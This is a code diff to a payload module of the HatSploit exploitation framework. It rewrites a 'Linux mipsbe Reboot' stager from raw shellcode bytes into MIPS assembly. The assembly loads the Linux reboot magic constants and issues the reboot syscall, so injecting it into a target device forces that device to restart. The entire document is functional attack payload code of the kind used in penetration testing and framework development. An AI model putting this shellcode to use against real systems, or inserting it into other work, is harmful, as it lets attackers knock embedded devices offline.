@@ -6,9 +6,10 @@
 #
 
 from hatsploit.lib.payload import Payload
+from hatsploit.utils.payload import PayloadTools
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, PayloadTools):
     details = {
         'Category': "stager",
         'Name': "Linux mipsbe Reboot",
@@ -24,13 +25,17 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        return (
-            b"\x3c\x06\x43\x21"  # lui     a2,0x4321
-            b"\x34\xc6\xfe\xdc"  # ori     a2,a2,0xfedc
-            b"\x3c\x05\x28\x12"  # lui     a1,0x2812
-            b"\x34\xa5\x19\x69"  # ori     a1,a1,0x1969
-            b"\x3c\x04\xfe\xe1"  # lui     a0,0xfee1
-            b"\x34\x84\xde\xad"  # ori     a0,a0,0xdead
-            b"\x24\x02\x0f\xf8"  # li      v0,4088
-            b"\x01\x01\x01\x0c"  # syscall 0x40404
+        return self.assemble(
+            self.details['Architecture'],
+            """
+            start:
+                lui $a2, 0x4321
+                ori $a2, $a2, 0xfedc
+                lui $a1, 0x2812
+                ori	$a1, $a1, 0x1969
+                lui	$a0, 0xfee1
+                ori $a0, $a0, 0xdead
+                addiu $v0, $zero, 0xff8
+                syscall	0x40404
+            """
         )
